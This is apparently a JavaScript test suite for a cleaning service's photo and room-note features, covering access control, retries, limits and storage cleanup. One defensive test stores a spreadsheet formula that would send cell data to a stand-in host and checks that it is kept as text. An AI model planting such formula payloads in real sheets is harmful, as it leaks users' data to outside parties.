/* The cleaner's room photos and notes, r48.
   Real Worker -> Apps Script -> in-memory Sheets and immutable R2 storage.
   Proves who may add and who may see, not merely that a page shows a button. */
const fs = require('fs'), path = require('path'), vm = require('vm');
const assert = require('assert/strict');
const { randomUUID } = require('crypto');
function harness(file, marker, exports) {
    const source = fs.readFileSync(path.join(__dirname, file), 'utf8');
    const end = source.indexOf(marker); assert.ok(end > 0);
    return vm.runInNewContext(source.slice(0, end) + '\n(' + exports + ');', {
        require, __dirname, console, AbortController, setTimeout, clearTimeout,
        URL, URLSearchParams, Response, Request, Headers, TextEncoder, TextDecoder
    });
}
const H = harness('portal.test.js', 'const T = build();', '{ build, JOBS_HEADERS, LEADS_HEADERS }');
const W = harness('worker-proxy.test.js', 'const ASSETS =', '{ loadWorker }');
const T = H.build(), S = T.box;
T.propStore.PHOTO_BRIDGE_SECRET = 'test-photo-bridge';
function seed(tab, values) { tab.appendRow(tab._rows[0].map(h => values[h] === undefined ? '' : values[h])); }
seed(T.tabs.LEADS, { lead_id:'LEAD-A', contact_id:'CONTACT-A', name:'Customer A' });
for (const id of ['VEN-A','VEN-B']) seed(T.tabs.VENDORS, { vendor_id:id, status:'active', display_name:id });
seed(T.tabs.JOBS, { job_id:'JOB-A', lead_id:'LEAD-A', property_id:'PROPERTY-A', vendor_id:'VEN-A',
    beds:2, baths:1, service_type:'First Clean', scheduled_date:'2026-09-14', quoted_price:200 });
seed(T.tabs.JOBS, { job_id:'JOB-N', lead_id:'LEAD-A', property_id:'PROPERTY-A', vendor_id:'VEN-A',
    beds:1, baths:1, service_type:'First Clean', scheduled_date:'2026-09-15', quoted_price:180 });
const objects = new Map(); let puts = 0, failBeforeCommit = false, failAfterCommit = false;
const B = {
    head: async key => objects.has(key) ? {} : null,
    put: async (key, bytes) => { assert.ok(!objects.has(key), 'bucket lock rejects overwrites'); puts++; objects.set(key, Buffer.from(bytes)); },
    get: async key => objects.has(key) ? { body:objects.get(key) } : null,
    delete: async key => { for (const k of Array.isArray(key) ? key : [key]) {
        assert.ok(!k.startsWith('completion-photos/'), 'completion object must never be selected for deletion'); objects.delete(k);
    } }
};
const loaded = W.loadWorker(async (_, init) => {
    const d = JSON.parse(init.body);
    if (failBeforeCommit && d.action === 'commit') { failBeforeCommit = false; throw Error('offline before commit'); }
    const result = S.doPost({ postData:{ contents:JSON.stringify(d) } }).getContent();
    if (failAfterCommit && d.action === 'commit') { failAfterCommit = false; throw Error('lost response'); }
    return new Response(result);
});
const env = { WEBHOOK_URL:'https://example.test/webhook', BOOKING_PHOTOS:B, PHOTO_BRIDGE_SECRET:'test-photo-bridge' };
/* What the cleaner's page sends: no confirmation field of any kind. */
const credentials = { auth_kind:'partner', job_id:'JOB-A', room_key:'BEDROOM_1', t:S.ticketToken('JOB-A','partner'), purpose:'completion' };
const jpeg = new Blob([new Uint8Array([255,216,255,224,0,2,255,217])], { type:'image/jpeg' });
async function request(data, file) {
    let body, headers;
    if (file) { body = new FormData(); body.append('data', JSON.stringify(data)); body.append('photo', file, 'test.jpg'); }
    else { body = JSON.stringify(data); headers = { 'Content-Type':'application/json' }; }
    return loaded.worker.fetch(new Request('https://servecleaning.com/api/photos', { method:'POST', headers, body }), env);
}
async function json(data, file) {
    const response = await request(data, file);
    assert.match(response.headers.get('Content-Type'), /application\/json/, 'metadata or rejected requests must not disclose an image');
    return response.json();
}
const direct = d => JSON.parse(S.doPost({ postData:{ contents:JSON.stringify(d) } }).getContent());
const partner = (job='JOB-A') => JSON.parse(S.handleTicket({ job, view:'partner', t:S.ticketToken(job,'partner') }).getContent());
const owner = (vendor='VEN-A') => ({ auth_kind:'vendor', vendor_id:vendor, t:S.vendorToken(vendor) });
const vendorJob = (vendor, job='JOB-A') => S.buildVendorPortalModel(T.ss, S.getVendor(T.ss, vendor)).bookings.find(b => b.bookingId === job);
const portal = () => JSON.parse(S.handlePortal({ portal:'CONTACT-A', t:S.portalToken('CONTACT-A') }).getContent());
/* Values built inside the vm carry its Array and Object; compare as data. */
const same = (a, b, m) => assert.deepEqual(JSON.parse(JSON.stringify(a)), JSON.parse(JSON.stringify(b)), m);
const jobCol = name => H.JOBS_HEADERS.indexOf(name);
const jobRow = id => T.tabs.JOBS._rows.find(r => r[0] === id);
(async function () {
    /* ---------------- PHOTOS ---------------- */
    const photoId = randomUUID(), upload = { ...credentials, action:'upload', photo_id:photoId };
    assert.equal((await json({ ...upload, t:'wrong' }, jpeg)).ok, false);
    assert.equal((await json({ ...upload, auth_kind:'portal', contact_id:'CONTACT-A', t:S.portalToken('CONTACT-A') }, jpeg)).ok, false);
    assert.equal((await json({ ...upload, ...owner() }, jpeg)).ok, false, 'owner cannot pretend to be cleaner');
    assert.equal((await json({ ...upload, room_key:'BEDROOM_99' }, jpeg)).ok, false);
    assert.equal(objects.size, 0);
    const result = await json(upload, jpeg);
    assert.equal(result.ok, true, 'an upload needs no finished-room confirmation: ' + JSON.stringify(result));
    assert.equal(result.photo.purpose, 'completion');
    assert.ok(objects.has('completion-photos/' + photoId + '.jpg'));
    assert.equal(partner().completionPhotos[0].id, photoId);
    assert.equal(partner().photos.length, 0, 'customer reference gallery stays separate');
    assert.equal('completionHistory' in S.buildVendorPortalModel(T.ss, S.getVendor(T.ss, 'VEN-A')), false, 'no separate archive');
    const report = vendorJob('VEN-A').report;
    same(report.map(r => [r.key, r.label, r.note, r.photos.map(p => p.id)]), [['BEDROOM_1', 'Bedroom 1', '', [photoId]]],
        'the company sees the photo on that job, under its room');
    assert.equal(vendorJob('VEN-A', 'JOB-N').report.length, 0, 'a job with nothing added reports nothing');
    assert.equal(vendorJob('VEN-B'), undefined);
    const sheet = T.tabs.COMPLETION_PHOTOS, headers = sheet._rows[0];
    same(headers, ['photo_id','job_id','vendor_id','room_key','object_key','status','bytes','created_at','updated_at']);
    assert.equal(sheet._rows[1][headers.indexOf('vendor_id')], 'VEN-A', 'the company is stamped at upload');
    const read = { ...upload, ...owner(), action:'read' };
    assert.equal((await request(read)).headers.get('Content-Type'), 'image/jpeg');
    assert.equal((await json({ ...read, ...owner('VEN-B') })).ok, false);
    assert.equal((await json({ ...read, job_id:'JOB-B' })).ok, false);
    assert.equal((await json({ ...read, room_key:'KITCHEN' })).ok, false);
    assert.equal(direct({ ...read, room_key:'KITCHEN', event_type:'booking_photo', bridge_token:env.PHOTO_BRIDGE_SECRET }).ok, false, 'backend itself binds the room before returning the storage key');
    assert.equal((await json({ ...upload, action:'delete' })).ok, false);
    assert.equal((await json({ ...read, action:'delete' })).ok, false);
    assert.equal((await json({ ...upload, action:'delete', purpose:'instruction', auth_kind:'portal', contact_id:'CONTACT-A', t:S.portalToken('CONTACT-A') })).ok, false);
    assert.equal(direct({ ...upload, event_type:'booking_photo', bridge_token:env.PHOTO_BRIDGE_SECRET, action:'delete' }).ok, false, 'backend also forbids deletion');
    const count = puts;
    assert.equal((await json(upload, jpeg)).ok, true); assert.equal(puts, count);
    failBeforeCommit = true;
    const retry = { ...upload, photo_id:randomUUID() };
    assert.equal((await json(retry, jpeg)).ok, false);
    const original = Buffer.from(objects.get('completion-photos/' + retry.photo_id + '.jpg'));
    assert.equal((await json(retry, new Blob([new Uint8Array([255,216,1,1,255,217])], { type:'image/jpeg' }))).ok, true);
    same(objects.get('completion-photos/' + retry.photo_id + '.jpg'), original, 'retry keeps the original bytes');
    failAfterCommit = true;
    const lost = { ...upload, photo_id:randomUUID() };
    assert.equal((await json(lost, jpeg)).ok, false);
    assert.equal((await json(lost, jpeg)).ok, true);
    assert.equal(partner().completionPhotos.length, 3, 'lost responses do not duplicate records');
    // Orphaned completion objects are retained too, never swept into instruction cleanup.
    const orphan = { ...upload, photo_id:randomUUID() };
    failBeforeCommit = true; assert.equal((await json(orphan, jpeg)).ok, false);
    const orphanRow = sheet._rows.find(r => r[0] === orphan.photo_id);
    orphanRow[headers.indexOf('created_at')] = new Date(Date.now() - 90000000);
    await loaded.box.cleanupPhotoStorage(env);
    assert.equal(objects.size, 4);
    assert.equal(orphanRow[headers.indexOf('status')], 'PENDING');
    for (let i = 3; i < 20; i++) assert.equal((await json({ ...upload, photo_id:randomUUID() }, jpeg)).ok, true);
    assert.equal((await json({ ...upload, photo_id:randomUUID() }, jpeg)).error, 'completion_photo_limit');
    assert.ok(!JSON.stringify(portal()).includes(photoId), 'the cleaner photos are not sent to the customer');
    assert.ok(!JSON.stringify(S.buildVendorPortalModel(T.ss, S.getVendor(T.ss, 'VEN-A'))).includes('object_key'));

    /* ---------------- NOTES ---------------- */
    const N = { event_type:'partner_note', job_id:'JOB-N', t:S.ticketToken('JOB-N','partner'), room_key:'KITCHEN' };
    const viaWorker = async d => (await loaded.worker.fetch(new Request('https://servecleaning.com/api/job',
        { method:'POST', headers:{ 'Content-Type':'text/plain;charset=utf-8' }, body:JSON.stringify(d) }), env)).json();
    const noteOf = (model, key) => model.scope.find(r => r.key === key).note;
    const portalJob = id => portal().bookings.find(b => b.bookingId === id);

    assert.equal(direct({ ...N, note:'' }).ok, true, 'a blank note before any note is a no-op');
    assert.equal(T.tabs.PARTNER_NOTES, undefined, 'and creates no tab');
    /* The customer's own words, to prove a cleaner's note cannot land on them. */
    assert.equal(direct({ event_type:'booking_instruction', job_id:'JOB-N', t:S.ticketToken('JOB-N','client'),
        scope_type:'BOOKING', scope_key:'GENERAL', instruction:'Please do the oven' }).ok, true);
    assert.equal(direct({ event_type:'booking_instruction', job_id:'JOB-N', t:S.ticketToken('JOB-N','client'),
        scope_type:'ROOM', scope_key:'KITCHEN', instruction:'Mind the plant' }).ok, true);

    for (const [label, over] of [
        ['a wrong token', { t:'wrong-token-value-here' }],
        ["the customer's ticket token", { t:S.ticketToken('JOB-N','client') }],
        ['a portal token', { t:S.portalToken('CONTACT-A') }],
        ['a vendor token', { t:S.vendorToken('VEN-A') }],
        ["another job's partner token", { t:S.ticketToken('JOB-A','partner') }],
    ]) assert.equal((await viaWorker({ ...N, ...over, note:'x' })).error, 'not_found', label + ' cannot write a cleaner note');
    assert.equal((await viaWorker({ ...N, room_key:'BEDROOM_9', note:'x' })).error, 'unknown_room');
    assert.equal(T.tabs.PARTNER_NOTES, undefined, 'refused writes store nothing');

    const saved = await viaWorker({ ...N, note:'  Oven door sticks  ' });
    assert.equal(saved.ok, true, JSON.stringify(saved));
    same(T.tabs.PARTNER_NOTES._rows[0], ['note_id','job_id','vendor_id','room_key','room_label','note','created_at','updated_at']);
    const noteRow = T.tabs.PARTNER_NOTES._rows[1];
    same(noteRow.slice(1, 6), ['JOB-N', 'VEN-A', 'KITCHEN', 'Kitchen', 'Oven door sticks']);
    assert.equal(noteOf(partner('JOB-N'), 'KITCHEN'), 'Oven door sticks', 'the cleaner sees their note again');
    assert.equal(noteOf(partner('JOB-N'), 'BEDROOM_1'), '');
    same(portalJob('JOB-N').partnerNotes, [{ roomLabel:'Kitchen', note:'Oven door sticks' }],
        'the customer sees the room and the text, and nothing else');
    assert.equal(portalJob('JOB-N').generalInstruction, 'Please do the oven', "the customer's general note is untouched");
    assert.equal(portalJob('JOB-N').rooms.find(r => r.key === 'KITCHEN').instruction, 'Mind the plant', "and so is the customer's room note");
    assert.equal(partner('JOB-N').scope.find(r => r.key === 'KITCHEN').instruction, 'Mind the plant');
    same(vendorJob('VEN-A', 'JOB-N').report, [{ key:'KITCHEN', label:'Kitchen', note:'Oven door sticks', photos:[] }],
        'the company sees the note on that job');

    assert.equal(direct({ ...N, note:'Oven door fixed itself' }).ok, true);
    assert.equal(T.tabs.PARTNER_NOTES._rows.length, 2, 'one row per room, updated in place');
    assert.equal(noteOf(partner('JOB-N'), 'KITCHEN'), 'Oven door fixed itself');
    /* Sheets reads a leading apostrophe as "this is text" and drops it, and so
       does the harness — so what matters is what was WRITTEN. */
    const formula = '=IMAGE("https://example.test/?"&A1)', written = [], realRange = T.tabs.PARTNER_NOTES.getRange;
    T.tabs.PARTNER_NOTES.getRange = (...a) => { const r = realRange(...a), set = r.setValue;
        r.setValue = v => { written.push(v); return set(v); }; return r; };
    assert.equal(direct({ ...N, note:formula }).ok, true);
    T.tabs.PARTNER_NOTES.getRange = realRange;
    assert.ok(written.includes("'" + formula), 'a formula-looking note is written as text: ' + JSON.stringify(written));
    assert.equal(noteOf(partner('JOB-N'), 'KITCHEN'), formula, 'and reads back as typed');

    jobRow('JOB-N')[jobCol('vendor_id')] = 'VEN-B';
    assert.equal(noteOf(partner('JOB-N'), 'KITCHEN'), '', "a job moved to another company does not carry the first company's note");
    assert.equal(vendorJob('VEN-B', 'JOB-N').report.length, 0);
    same(portalJob('JOB-N').partnerNotes, []);
    jobRow('JOB-N')[jobCol('vendor_id')] = 'VEN-A';

    assert.equal(direct({ ...N, note:'' }).ok, true);
    assert.equal(T.tabs.PARTNER_NOTES._rows.length, 2, 'blanking keeps the row');
    same(portalJob('JOB-N').partnerNotes, [], 'and shows nothing');
    assert.equal(vendorJob('VEN-A', 'JOB-N').report.length, 0);
    assert.equal(direct({ ...N, note:'Back door lock is stiff' }).ok, true);

    jobRow('JOB-N')[jobCol('job_status')] = 'cancelled';
    assert.equal(direct({ ...N, note:'x' }).error, 'closed', 'a called-off visit takes no notes');
    same(portalJob('JOB-N').partnerNotes, []);
    jobRow('JOB-N')[jobCol('job_status')] = '';
    jobRow('JOB-N')[jobCol('completed_date')] = '2026-09-15';
    assert.equal(direct({ ...N, note:'x' }).error, 'closed', 'a finished job takes no notes');
    same(portalJob('JOB-N').partnerNotes, [{ roomLabel:'Kitchen', note:'Back door lock is stiff' }],
        'the customer keeps the note on the finished booking');
    assert.equal(vendorJob('VEN-A', 'JOB-N').report[0].note, 'Back door lock is stiff');

    /* ---------------- AFTER THE JOB ---------------- */
    const row = jobRow('JOB-A');
    row[jobCol('completed_date')] = '2026-09-14';
    assert.equal((await json({ ...upload, action:'read' })).error, 'closed');
    assert.equal((await json({ ...upload, photo_id:randomUUID() }, jpeg)).error, 'closed');
    assert.equal((await request(read)).headers.get('Content-Type'), 'image/jpeg', 'owner can review completed jobs');
    assert.equal(vendorJob('VEN-A').report[0].photos.length, 20, 'the completed job still shows its photos');
    row[jobCol('vendor_id')] = 'VEN-B';
    assert.equal(vendorJob('VEN-B').report.length, 0, "another company cannot inherit the photos by receiving the job");
    assert.equal((await json({ ...read, ...owner('VEN-B') })).ok, false);
    T.tabs.JOBS.deleteRow(2);
    await loaded.box.cleanupPhotoStorage(env);
    assert.equal(objects.size, 21, 'cleanup never removes a cleaner photo');
    console.log('Cleaner photos and notes: no confirmation step, isolation, immutable retries, limits, per-job vendor report, customer-visible notes, and cleanup safety passed.');
})().catch(err => { console.error(err); process.exitCode = 1; });
